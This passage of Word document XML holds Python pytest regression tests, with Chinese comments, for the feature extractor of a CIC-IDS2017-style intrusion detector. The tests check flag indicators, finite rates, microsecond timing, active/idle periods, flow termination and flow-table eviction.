    <w:p w14:paraId="16DB7A7D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert feats["Total Length of Fwd Packets"] == 60.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1662D9A9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40387156">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E1F822C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_flag_columns_are_indicators_not_counts():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B80A3EB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """回归：CIC-IDS2017 发布的 flag 列取值只有 0/1。按出现次数输出的话，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A69BECB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    一条 200 包的洪流给出 200，而训练集最大值是 1，等于把证据送到了模型没见过的区间。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AFD660B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    table = FlowTable()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78B8D7F8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for i in range(200):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18C5D416">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        table.add(pkt(1000.0 + i * 0.0002, flags=SYN))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1589F6DC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    feats = flow_features(next(iter(table.flows.values())))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10128D64">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert feats["SYN Flag Count"] == 1.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48EA35B9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert feats["Total Fwd Packets"] == 200</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F7EC527">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert feats["PSH Flag Count"] == 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79C8E959">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="452CF11F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2BA58AC1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_rate_features_stay_finite_for_single_packet_flow():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40726AA7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """回归：时长为 0 时 Flow Bytes/s 会变成 inf。训练管道会把含 inf 的行整行丢掉，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AA12628">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    线上不会——它会把这个 inf 直接喂进模型。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="454CA750">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    table = FlowTable()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3266189E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    table.add(pkt(2000.0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0653AAAF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    feats = flow_features(next(iter(table.flows.values())))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60FE600C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for name in ("Flow Bytes/s", "Flow Packets/s", "Fwd Packets/s", "Bwd Packets/s"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C6156C2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        assert math.isfinite(feats[name]), f"{name} 不是有限值：{feats[name]}"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07E63CF2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15A22590">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0DC249A6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_iat_is_in_microseconds():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3457211F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    table = FlowTable()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="325B8B0B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    table.add(pkt(3000.0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04AC4A0A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    table.add(pkt(3000.25))   # 250 ms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04F7F0DF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    feats = flow_features(next(iter(table.flows.values())))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DED0BC5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert feats["Flow IAT Max"] == pytest.approx(250_000.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FF1B8D5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert feats["Fwd IAT Total"] == pytest.approx(250_000.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E900D33">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4FF783B9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="789FB7F1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_active_idle_split_on_five_second_gap():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ADCC639">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    table = FlowTable()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27907F18">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    table.add(pkt(4000.0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="400B5539">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    table.add(pkt(4002.0))    # 同一活跃期，长 2 s</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53C1A6B1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    table.add(pkt(4010.0))    # 间隔 8 s &gt;= 5 s，进入空闲期</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A8FD887">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    feats = flow_features(next(iter(table.flows.values())))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C215E09">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert feats["Idle Max"] == pytest.approx(8_000_000.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="585B9B19">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert feats["Active Max"] == pytest.approx(2_000_000.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74B5897E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="598F40CD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76EBBA6E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_fin_terminates_flow():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E16C2DF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    table = FlowTable()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C64D130">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    table.add(pkt(5000.0, flags=FIN | ACK))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39547C1E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    done = table.expire(5000.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C63D0CF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert len(done) == 1 and not table.flows</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11F82515">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert flow_features(done[0])["FIN Flag Count"] == 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BF479BC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="09D1BC07">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F884C90">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_flow_table_evicts_least_recently_used():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EB06B35">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """回归：扫描类攻击会瞬间造出上万个单包流，不设上限会吃光内存。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E6E9786">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    table = FlowTable(max_flows=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B5C7947">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for i in range(5):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F649A88">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        table.add(pkt(6000.0 + i, src=("10.0.0.1", 40000 + i)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F122BEB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert len(table.flows) == 3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EA9FF53">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert table.dropped == 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59ECC821">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="46BC2F44">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="14A3AA46">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_snapshot_does_not_remove_flows():</w:t>
      </w:r>
